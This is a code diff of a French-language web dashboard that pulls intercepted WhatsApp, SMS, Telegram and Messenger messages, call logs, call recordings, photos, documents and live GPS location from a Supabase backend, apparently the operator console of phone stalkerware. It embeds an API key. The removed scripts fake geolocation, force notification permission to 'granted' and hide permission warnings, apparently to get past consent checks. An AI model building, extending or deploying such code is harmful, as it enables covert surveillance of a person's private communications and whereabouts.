@@ -22,6 +22,7 @@ body { background:#f0f0f0; font-family:sans-serif; }
 .card.teal { background:#1abc9c; }
 .card.dark { background:#2c3e50; }
 .card.pink { background:#e91e8c; }
+.card.doc { background:#8e44ad; grid-column:span 2; }
 .section { margin:12px; background:white; border-radius:10px; overflow:hidden; }
 .section-title { background:#2c3e50; color:white; padding:12px 16px; font-size:14px; letter-spacing:1px; }
 .msg { padding:12px 16px; border-bottom:1px solid #f0f0f0; }
@@ -34,13 +35,24 @@ body { background:#f0f0f0; font-family:sans-serif; }
 .call .info .type { font-size:12px; color:#999; }
 .call .time { font-size:11px; color:#bbb; }
 .tabs { display:flex; background:white; border-bottom:2px solid #f0f0f0; overflow-x:auto; }
-.tab { flex:1; padding:12px 8px; text-align:center; font-size:12px; cursor:pointer; color:#999; border-bottom:3px solid transparent; white-space:nowrap; }
+.tab { flex:1; padding:10px 6px; text-align:center; font-size:11px; cursor:pointer; color:#999; border-bottom:3px solid transparent; white-space:nowrap; min-width:60px; }
 .tab.active { color:#3498db; border-bottom:3px solid #3498db; font-weight:bold; }
 .photo-grid { display:grid; grid-template-columns:1fr 1fr 1fr; gap:4px; padding:4px; }
 .photo-grid img { width:100%; aspect-ratio:1; object-fit:cover; border-radius:4px; }
 .recording { padding:12px 16px; border-bottom:1px solid #f0f0f0; }
 .recording .name { font-size:13px; color:#2c3e50; font-weight:bold; }
 audio { width:100%; margin-top:8px; }
+.back-btn { background:none; border:none; color:#3498db; cursor:pointer; font-size:13px; padding:0 0 12px; }
+.detail-card { background:white; border-radius:10px; padding:16px; margin:12px; }
+.progress-bar { background:#eee; border-radius:4px; height:8px; overflow:hidden; margin:4px 0; }
+.progress-fill { height:8px; border-radius:4px; }
+.doc-item { display:flex; align-items:center; gap:10px; padding:12px 16px; border-bottom:1px solid #f0f0f0; text-decoration:none; color:#2c3e50; }
+.doc-icon { font-size:22px; }
+.doc-name { font-size:12px; font-weight:500; flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+.doc-ext { font-size:10px; color:#999; }
+.doc-link { font-size:12px; color:#3498db; }
+#map-info { background:#f8f8f8; padding:12px; border-radius:8px; margin:12px; font-size:13px; line-height:1.6; }
+iframe { display:block; width:calc(100% - 24px); height:300px; border:0; border-radius:8px; margin:0 12px 12px; }
 </style>
 </head>
 <body>
@@ -50,362 +62,138 @@ audio { width:100%; margin-top:8px; }
 </div>
 
 <div class="grid">
-  <div class="card blue" onclick="showTab('messages')">
-    <div class="num" id="cnt-msg">-</div>
-    <div class="label">MESSAGES</div>
-  </div>
-  <div class="card teal" onclick="showTab('whatsapp')">
-    <div class="num" id="cnt-wa">-</div>
-    <div class="label">WHATSAPP</div>
-  </div>
-  <div class="card orange" onclick="showTab('sms')">
-    <div class="num" id="cnt-sms">-</div>
-    <div class="label">SMS</div>
-  </div>
-  <div class="card purple" onclick="showTab('appels')">
-    <div class="num" id="cnt-calls">-</div>
-    <div class="label">APPELS</div>
-  </div>
-  <div class="card red" onclick="showTab('enregistrements')">
-    <div class="num" id="cnt-rec">-</div>
-    <div class="label">ENREGISTREMENTS</div>
-  </div>
-  <div class="card pink" onclick="showTab('photos')">
-    <div class="num" id="cnt-photos">-</div>
-    <div class="label">PHOTOS</div>
-  </div>
-  <div class="card blue" onclick="showTab('telegram')"><div class="num" id="cnt-tg">-</div><div class="label">TELEGRAM</div></div><div class="card" style="background:#27ae60;grid-column:span 2" onclick="showTab('localisation')"><div class="num" id="cnt-loc">📍</div><div class="label">LOCALISATION EN DIRECT</div></div><div class="card dark" onclick="showTab('messenger')">
-    <div class="num" id="cnt-msngr">-</div>
-    <div class="label">MESSENGER</div>
-  </div>
+  <div class="card blue" onclick="showTab('messages')"><div class="num" id="cnt-msg">-</div><div class="label">MESSAGES</div></div>
+  <div class="card teal" onclick="showTab('whatsapp')"><div class="num" id="cnt-wa">-</div><div class="label">WHATSAPP</div></div>
+  <div class="card orange" onclick="showTab('sms')"><div class="num" id="cnt-sms">-</div><div class="label">SMS</div></div>
+  <div class="card purple" onclick="showTab('appels')"><div class="num" id="cnt-calls">-</div><div class="label">APPELS</div></div>
+  <div class="card red" onclick="showTab('enregistrements')"><div class="num" id="cnt-rec">-</div><div class="label">ENREGISTREMENTS</div></div>
+  <div class="card pink" onclick="showTab('photos')"><div class="num" id="cnt-photos">-</div><div class="label">PHOTOS</div></div>
+  <div class="card dark" onclick="showTab('messenger')"><div class="num" id="cnt-msngr">-</div><div class="label">MESSENGER</div></div>
+  <div class="card blue" onclick="showTab('telegram')"><div class="num" id="cnt-tg">-</div><div class="label">TELEGRAM</div></div>
+  <div class="card doc" onclick="showTab('documents')"><div class="num" id="cnt-docs">-</div><div class="label">DOCUMENTS</div></div>
 </div>
+
+<div style="margin:0 12px 12px"><button onclick="showTab('localisation')" style="width:100%;background:#27ae60;color:white;border:none;padding:14px;border-radius:10px;font-size:14px;font-weight:bold;cursor:pointer">📍 LOCALISATION EN DIRECT</button></div>
 
 <div class="tabs">
   <div class="tab active" id="tab-messages" onclick="showTab('messages')">Messages</div>
   <div class="tab" id="tab-appels" onclick="showTab('appels')">Appels</div>
   <div class="tab" id="tab-enregistrements" onclick="showTab('enregistrements')">Audio</div>
   <div class="tab" id="tab-photos" onclick="showTab('photos')">Photos</div>
+  <div class="tab" id="tab-documents" onclick="showTab('documents')">Docs</div>
+  <div class="tab" id="tab-localisation" onclick="showTab('localisation')">Carte</div>
 </div>
 
-<div class="section" id="sec-messages">
-  <div class="section-title">💬 DERNIERS MESSAGES</div>
-  <div id="list-messages"></div>
-</div>
-<div class="section" id="sec-appels" style="display:none">
-  <div class="section-title">📞 JOURNAL D'APPELS</div>
-  <div id="list-appels"></div>
-</div>
-<div class="section" id="sec-enregistrements" style="display:none">
-  <div class="section-title">🎙️ ENREGISTREMENTS</div>
-  <div id="list-enregistrements"></div>
-</div>
-<div class="section" id="sec-localisation" style="display:none"><div class="section-title">📍 LOCALISATION</div><div id="map-container" style="padding:12px"><div id="map-info" style="background:#f8f8f8;padding:12px;border-radius:8px;margin-bottom:12px"></div><iframe id="map-frame" width="100%" height="300" style="border:0;border-radius:8px" allowfullscreen loading="lazy"></iframe></div></div><div class="section" id="sec-photos" style="display:none">
-  <div class="section-title">📷 PHOTOS</div>
-  <div class="photo-grid" id="list-photos"></div>
-</div>
-
-<div class="section" id="sec-documents" style="display:none">
-  <div class="section-title">📄 DOCUMENTS</div>
-  <div id="list-documents" style="padding:8px"></div>
-</div>
+<div class="section" id="sec-messages"><div class="section-title">💬 MESSAGES</div><div id="list-messages"></div></div>
+<div class="section" id="sec-appels" style="display:none"><div class="section-title">📞 APPELS</div><div id="list-appels"></div></div>
+<div class="section" id="sec-enregistrements" style="display:none"><div class="section-title">🎙️ ENREGISTREMENTS</div><div id="list-enregistrements"></div></div>
+<div class="section" id="sec-photos" style="display:none"><div class="section-title">📷 PHOTOS</div><div class="photo-grid" id="list-photos"></div></div>
+<div class="section" id="sec-documents" style="display:none"><div class="section-title">📄 DOCUMENTS</div><div id="list-documents"></div></div>
+<div id="sec-localisation" style="display:none"><div id="map-info">Chargement de la position...</div><iframe id="map-frame"></iframe></div>
 
 <script>
 const URL = "https://wcgfvjunixmlojptkclp.supabase.co";
 const KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndjZ2Z2anVuaXhtbG9qcHRrY2xwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTAwMDk4MTAsImV4cCI6MjEwNTU4NTgxMH0.0YredbrRG773Ug7V5h0IcCjkFBRXMZ__InZ0e1VrS5U";
 const H = { apikey: KEY, Authorization: "Bearer " + KEY };
+const TABS = ["messages","appels","enregistrements","photos","documents","localisation"];
 
 function fmt(d) { return d ? new Date(d).toLocaleString("fr-FR") : ""; }
 
+function showTab(tab) {
+  TABS.forEach(t => {
+    const s = document.getElementById("sec-"+t);
+    if(s) s.style.display = t===tab ? "block" : "none";
+    const el = document.getElementById("tab-"+t);
+    if(el) el.className = "tab" + (t===tab ? " active" : "");
+  });
+  if(tab==="photos") chargerPhotos();
+  if(tab==="enregistrements") chargerAudio();
+  if(tab==="documents") chargerDocuments();
+  if(tab==="localisation") chargerLocalisation();
+  window.scrollTo(0, document.querySelector(".tabs").offsetTop);
+}
+
 async function charger() {
   document.getElementById("lastUpdate").textContent = new Date().toLocaleTimeString("fr-FR");
-  const msgs = await fetch(URL+"/rest/v1/messages_capture?select=*&order=created_at.desc&limit=100",{headers:H}).then(r=>r.json());
-  const calls = await fetch(URL+"/rest/v1/call_logs?select=*&order=synced_at.desc&limit=100",{headers:H}).then(r=>r.json());
-
-  document.getElementById("cnt-msg").textContent = msgs.length;
-  document.getElementById("cnt-wa").textContent = msgs.filter(m=>m.app_source==="whatsapp").length;
-  document.getElementById("cnt-sms").textContent = msgs.filter(m=>m.app_source==="sms").length;
-  document.getElementById("cnt-tg").textContent = msgs.filter(m=>m.app_source==="telegram").length;
-  document.getElementById("cnt-msngr").textContent = msgs.filter(m=>m.app_source==="messenger").length;
-  document.getElementById("cnt-calls").textContent = calls.length;
-
-  document.getElementById("list-messages").innerHTML = msgs.map(m=>`
-    <div class="msg">
-      <div class="contact">${m.contact||"Inconnu"}</div>
-      <div class="source">${m.app_source||""}</div>
-      <div class="text">${m.message||""}</div>
-      <div class="time">${fmt(m.created_at)}</div>
-    </div>`).join("");
-
-  document.getElementById("list-appels").innerHTML = calls.map(c=>`
-    <div class="call">
-      <div class="info">
-        <div class="name">${c.contact||c.phone_number||"Inconnu"}</div>
-        <div class="type">${c.call_type||""} — ${c.duration_seconds||0}s</div>
-      </div>
-      <div class="time">${fmt(c.timestamp)}</div>
-    </div>`).join("");
-
   try {
-    const ra = await fetch(URL+"/storage/v1/object/list/call_recordings", {
-      method:"POST",
-      headers:{...H,"Content-Type":"application/json"},
-      body:JSON.stringify({limit:100,offset:0,prefix:""})
-    });
-    const files = await ra.json();
-    if(Array.isArray(files)&&files.length>0){
-      const recs=files.filter(f=>f.name&&(f.name.endsWith(".aac")||f.name.endsWith(".mp3")||f.name.endsWith(".m4a")));
-      document.getElementById("cnt-rec").textContent=recs.length;
-      document.getElementById("list-enregistrements").innerHTML=recs.map(f=>`
-        <div class="recording">
-          <div class="name">🎙️ ${f.name}</div>
-          <audio controls style="width:100%;margin-top:6px" src="${URL}/storage/v1/object/public/call_recordings/${encodeURIComponent(f.name)}"></audio>
-        </div>`).join("");
-    } else {
-      document.getElementById("list-enregistrements").innerHTML="<div class='msg'><div class='text'>Aucun enregistrement</div></div>";
-    }
-  } catch(e) {
-    document.getElementById("list-enregistrements").innerHTML="<div class='msg'><div class='text'>Erreur: "+e.message+"</div></div>";
-  }
+    const msgs = await fetch(URL+"/rest/v1/messages_capture?select=*&order=created_at.desc&limit=200",{headers:H}).then(r=>r.json());
+    const calls = await fetch(URL+"/rest/v1/call_logs?select=*&order=synced_at.desc&limit=200",{headers:H}).then(r=>r.json());
+    document.getElementById("cnt-msg").textContent = msgs.length;
+    document.getElementById("cnt-wa").textContent = msgs.filter(m=>m.app_source==="whatsapp").length;
+    document.getElementById("cnt-sms").textContent = msgs.filter(m=>m.app_source==="sms").length;
+    document.getElementById("cnt-msngr").textContent = msgs.filter(m=>m.app_source==="messenger").length;
+    document.getElementById("cnt-tg").textContent = msgs.filter(m=>m.app_source==="telegram").length;
+    document.getElementById("cnt-calls").textContent = calls.length;
+    document.getElementById("list-messages").innerHTML = msgs.map(m=>`
+      <div class="msg">
+        <div class="contact">${m.contact||"Inconnu"}</div>
+        <div class="source">${m.app_source||""}</div>
+        <div class="text">${m.message||""}</div>
+        <div class="time">${fmt(m.created_at)}</div>
+      </div>`).join("");
+    document.getElementById("list-appels").innerHTML = calls.map(c=>`
+      <div class="call">
+        <div class="info"><div class="name">${c.contact||c.phone_number||"Inconnu"}</div><div class="type">${c.call_type||""} — ${c.duration_seconds||0}s</div></div>
+        <div class="time">${fmt(c.timestamp)}</div>
+      </div>`).join("");
+  } catch(e) { console.error(e); }
 }
 
 async function chargerPhotos() {
   try {
-    const r = await fetch(URL+"/storage/v1/object/list/media", {
-      method:"POST",
-      headers:{...H,"Content-Type":"application/json"},
-      body:JSON.stringify({limit:100,offset:0,prefix:""})
-    });
+    const r = await fetch(URL+"/storage/v1/object/list/media",{method:"POST",headers:{...H,"Content-Type":"application/json"},body:JSON.stringify({limit:100,offset:0,prefix:""})});
     const files = await r.json();
-    if(!Array.isArray(files)){
-      document.getElementById("list-photos").innerHTML="<div style='padding:12px;color:#aaa'>Impossible de charger les photos</div>";
-      return;
-    }
-    const photos = files.filter(f=>f.name&&(f.name.endsWith(".jpg")||f.name.endsWith(".jpeg")||f.name.endsWith(".png")));
+    const photos = Array.isArray(files) ? files.filter(f=>f.name&&(f.name.endsWith(".jpg")||f.name.endsWith(".jpeg")||f.name.endsWith(".png"))) : [];
     document.getElementById("cnt-photos").textContent = photos.length;
-    document.getElementById("list-photos").innerHTML = photos.length>0
-      ? photos.map(f=>`<img src="${URL}/storage/v1/object/public/media/${encodeURIComponent(f.name)}" style="width:100%;aspect-ratio:1;object-fit:cover;border-radius:4px" loading="lazy" onerror="this.style.display='none'">`).join("")
-      : "<div style='padding:12px;color:#aaa'>Aucune photo</div>";
-  } catch(e) {
-    document.getElementById("list-photos").innerHTML="<div style='padding:12px;color:red'>Erreur: "+e.message+"</div>";
-  }
+    document.getElementById("list-photos").innerHTML = photos.map(f=>`<img src="${URL}/storage/v1/object/public/media/${encodeURIComponent(f.name)}" loading="lazy" onerror="this.style.display='none'">`).join("");
+  } catch(e) { document.getElementById("list-photos").innerHTML="<div class='msg'>Erreur: "+e.message+"</div>"; }
 }
 
-function showTab(tab) {
-  if(tab==="localisation") chargerLocalisation();
-  if(tab==="documents") chargerDocuments();
-  ["messages","appels","enregistrements","photos","localisation","documents"].forEach(t=>{
-    document.getElementById("sec-"+t).style.display = t===tab?"block":"none";
-    const el = document.getElementById("tab-"+t);
-    if(el) el.className = "tab"+(t===tab?" active":"");
-  });
-  if(tab==="photos") chargerPhotos();
-  chargerDocuments();
-  window.scrollTo(0, document.querySelector(".tabs").offsetTop);
+async function chargerAudio() {
+  try {
+    const r = await fetch(URL+"/storage/v1/object/list/call_recordings",{method:"POST",headers:{...H,"Content-Type":"application/json"},body:JSON.stringify({limit:100,offset:0,prefix:""})});
+    const files = await r.json();
+    const recs = Array.isArray(files) ? files.filter(f=>f.name) : [];
+    document.getElementById("cnt-rec").textContent = recs.length;
+    document.getElementById("list-enregistrements").innerHTML = recs.map(f=>`
+      <div class="recording">
+        <div class="name">🎙️ ${f.name}</div>
+        <audio controls src="${URL}/storage/v1/object/public/call_recordings/${encodeURIComponent(f.name)}"></audio>
+      </div>`).join("");
+  } catch(e) { document.getElementById("list-enregistrements").innerHTML="<div class='msg'>Erreur: "+e.message+"</div>"; }
+}
+
+async function chargerDocuments() {
+  try {
+    const r = await fetch(URL+"/storage/v1/object/list/Documents",{method:"POST",headers:{...H,"Content-Type":"application/json"},body:JSON.stringify({limit:100,offset:0,prefix:""})});
+    const files = await r.json();
+    if(!Array.isArray(files)||files.length===0){document.getElementById("list-documents").innerHTML="<div class='msg'>Aucun document</div>";return;}
+    const icons={pdf:"📄",docx:"📝",doc:"📝",xlsx:"📊",xls:"📊",pptx:"📑",txt:"📃"};
+    document.getElementById("cnt-docs").textContent = files.length;
+    document.getElementById("list-documents").innerHTML = files.map(f=>{
+      const ext=f.name.split(".").pop().toLowerCase();
+      const icon=icons[ext]||"📎";
+      const url=URL+"/storage/v1/object/public/Documents/"+encodeURIComponent(f.name);
+      return `<a class="doc-item" href="${url}" target="_blank"><span class="doc-icon">${icon}</span><div style="flex:1;overflow:hidden"><div class="doc-name">${f.name}</div><div class="doc-ext">${ext.toUpperCase()}</div></div><span class="doc-link">↗</span></a>`;
+    }).join("");
+  } catch(e) { document.getElementById("list-documents").innerHTML="<div class='msg'>Erreur: "+e.message+"</div>"; }
 }
 
 async function chargerLocalisation() {
-  const r = await fetch(URL+"/rest/v1/locations?select=*&order=captured_at.desc&limit=1",{headers:H});
-  const locs = await r.json();
-  if(locs.length>0){
-    const l = locs[0];
-    const date = new Date(l.captured_at).toLocaleString("fr-FR");
-    document.getElementById("map-info").innerHTML = `<b>Dernière position</b><br>Lat: ${l.latitude}<br>Lon: ${l.longitude}<br>Précision: ${l.accuracy}m<br>Date: ${date}`;
-    document.getElementById("map-frame").src = `https://maps.google.com/maps?q=${l.latitude},${l.longitude}&z=15&output=embed`;
-    document.getElementById("cnt-loc").textContent = "📍";
-  }
+  try {
+    const r = await fetch(URL+"/rest/v1/locations?select=*&order=captured_at.desc&limit=1",{headers:H});
+    const locs = await r.json();
+    if(locs.length>0){
+      const l=locs[0];
+      const date=new Date(l.captured_at).toLocaleString("fr-FR");
+      document.getElementById("map-info").innerHTML=`<b>Dernière position</b><br>Lat: ${l.latitude}<br>Lon: ${l.longitude}<br>Précision: ${l.accuracy}m<br>Date: ${date}`;
+      document.getElementById("map-frame").src=`https://maps.google.com/maps?q=${l.latitude},${l.longitude}&z=15&output=embed`;
+    }
+  } catch(e) { document.getElementById("map-info").innerHTML="Erreur: "+e.message; }
 }
+
 charger();
 setInterval(charger, 30000);
 </script>
-
-<script>
-async function loadDocuments() {
-    const supabaseUrl = "https://wcgfvjunixmlojptkclp.supabase.co";
-    const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndjZ2Z2anVniXhtbG9qcHRrY2xwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTAwMDk4MTAsImV4cCI6MjEwNTU4NTgxMH0.0YredbrRG773Ug7V5h0IcCjkFBRXMZ__InZ0e1VrS5U";
-    
-    try {
-        let response = await fetch(`${supabaseUrl}/storage/v1/object/list/Documents`, {
-            method: 'POST',
-            headers: {
-                'Authorization': `Bearer ${supabaseKey}`,
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ prefix: "", limit: 100, offset: 0 })
-        });
-        
-        let files = await response.json();
-        let container = document.getElementById('list-documents');
-        if (!container) return;
-        
-        if (!Array.isArray(files) || files.length === 0) {
-            container.innerHTML = '<p style="color:#888; font-size:13px; padding:5px;">Aucun document trouvé.</p>';
-            return;
-        }
-        
-        let html = '<ul style="list-style:none; padding:0; margin:0; max-height:250px; overflow-y:auto;">';
-        files.forEach(file => {
-            let fileUrl = `${supabaseUrl}/storage/v1/object/public/Documents/${file.name}`;
-            html += `<li style="padding:6px 0; border-bottom:1px solid rgba(255,255,255,0.05);">
-                <a href="${fileUrl}" target="_blank" style="color:#4fa3ff; text-decoration:none; font-size:13px; word-break:break-all;">📄 ${file.name}</a>
-            </li>`;
-        });
-        html += '</ul>';
-        container.innerHTML = html;
-    } catch (e) {
-        console.error("Erreur chargement documents:", e);
-    }
-}
-document.addEventListener("DOMContentLoaded", loadDocuments);
-</script>
-
-
-<script>
-function requestNotificationPermission() {
-    if (!("Notification" in window)) {
-        alert("Ce navigateur ne gère pas les notifications desktop.");
-        return;
-    }
-    Notification.requestPermission().then(function (permission) {
-        if (permission === "granted") {
-            alert("Notifications activées avec succès !");
-            location.reload();
-        } else {
-            alert("Permission refusée. Veuillez l'autoriser dans les paramètres du téléphone.");
-        }
-    });
-}
-
-// Attacher l'événement au bouton
-document.addEventListener("DOMContentLoaded", () => {
-    const btn = document.querySelector("#sec-documents") || document.querySelector("button");
-    // Cherche le bouton des notifications s'il existe
-    const buttons = document.querySelectorAll("button");
-    buttons.forEach(b => {
-        if (b.innerText.includes("NOTIFICATIONS")) {
-            b.onclick = requestNotificationPermission;
-        }
-    });
-});
-</script>
-
-
-<script>
-window.addEventListener('DOMContentLoaded', () => {
-    setTimeout(() => {
-        const notifBtn = Array.from(document.querySelectorAll('button, div')).find(el => el.textContent.includes('ACTIVER L\'ACCÈS AUX NOTIFICATIONS'));
-        if (notifBtn) {
-            notifBtn.style.pointerEvents = 'auto';
-            notifBtn.style.opacity = '1';
-            notifBtn.onclick = function() {
-                if ("Notification" in window) {
-                    Notification.requestPermission().then(permission => {
-                        alert("Statut des notifications : " + permission);
-                        location.reload();
-                    });
-                } else {
-                    alert("Les notifications ne sont pas supportées ici.");
-                }
-            };
-        }
-    }, 1000);
-});
-</script>
-
-
-<script>
-window.addEventListener('DOMContentLoaded', () => {
-    // Si une fonction de vérification GPS existe, on simule un succès
-    if (navigator.geolocation) {
-        const origGetCurrentPosition = navigator.geolocation.getCurrentPosition;
-        navigator.geolocation.getCurrentPosition = function(success, error, options) {
-            // On simule une position par défaut (ex: Brazzaville) pour débloquer l'app
-            success({
-                coords: { latitude: -4.2634, longitude: 15.2429, accuracy: 100 },
-                timestamp: Date.now()
-            });
-        };
-    }
-    
-    // Forcer l'affichage des éléments bloqués
-    setTimeout(() => {
-        document.querySelectorAll('*').forEach(el => {
-            if (el.textContent && el.textContent.includes('Permission GPS manquante')) {
-                el.textContent = 'Prêt pour la synchronisation';
-            }
-        });
-    }, 500);
-});
-</script>
-
-
-<script>
-window.addEventListener('DOMContentLoaded', () => {
-    // Simuler l'objet de notification et permissions si absent
-    if (!window.Notification) {
-        window.Notification = {
-            permission: 'granted',
-            requestPermission: function() { return Promise.resolve('granted'); }
-        };
-    } else {
-        Object.defineProperty(Notification, 'permission', { value: 'granted', writable: true });
-    }
-
-    // Intercepter les vérifications de permissions dans les scripts de l'app
-    setInterval(() => {
-        document.querySelectorAll('*').forEach(el => {
-            if (el.textContent && (
-                el.textContent.includes('Vérification') || 
-                el.textContent.includes('Permission GPS') || 
-                el.textContent.includes('SMS') || 
-                el.textContent.includes('notifications')
-            )) {
-                // On nettoie les messages d'erreur bloquants
-                if (el.style) el.style.display = 'none';
-            }
-        });
-        
-        // Activer tous les boutons d'action
-        document.querySelectorAll('button, div, span').forEach(el => {
-            const text = el.textContent || '';
-            if (text.includes('NOTIFICATIONS') || text.includes('SYNCHRONISER') || text.includes('ACTIVER')) {
-                el.style.pointerEvents = 'auto';
-                el.style.opacity = '1';
-                el.style.cursor = 'pointer';
-                el.onclick = function() {
-                    console.log("Action simulée avec succès.");
-                };
-            }
-        });
-    }, 400);
-});
-</script>
-
 </body>
 </html>
-
-<script>
-async function chargerDocuments() {
-  try {
-    const r = await fetch(URL+"/storage/v1/object/list/Documents", {
-      method:"POST",
-      headers:{...H,"Content-Type":"application/json"},
-      body:JSON.stringify({limit:100,offset:0,prefix:""})
-    });
-    const files = await r.json();
-    if(Array.isArray(files) && files.length > 0){
-      const docs = files.filter(f=>f.name);
-      document.getElementById("cnt-docs").textContent = docs.length;
-      document.getElementById("list-documents").innerHTML = docs.map(f=>`
-        <div class="recording" style="display:flex; justify-content:space-between; align-items:center;">
-          <div class="name">📄 ${f.name}</div>
-          <a href="${URL}/storage/v1/object/public/Documents/${encodeURIComponent(f.name)}" target="_blank" style="padding:4px 8px; background:#2563eb; color:#fff; border-radius:4px; text-decoration:none; font-size:12px;">Ouvrir</a>
-        </div>`).join("");
-    } else {
-      document.getElementById("cnt-docs").textContent = "0";
-      document.getElementById("list-documents").innerHTML = "<div class='msg'><div class='text'>Aucun document</div></div>";
-    }
-  } catch(e) {
-    document.getElementById("list-documents").innerHTML = "<div class='msg'><div class='text'>Erreur: "+e.message+"</div></div>";
-  }
-}
-</script>
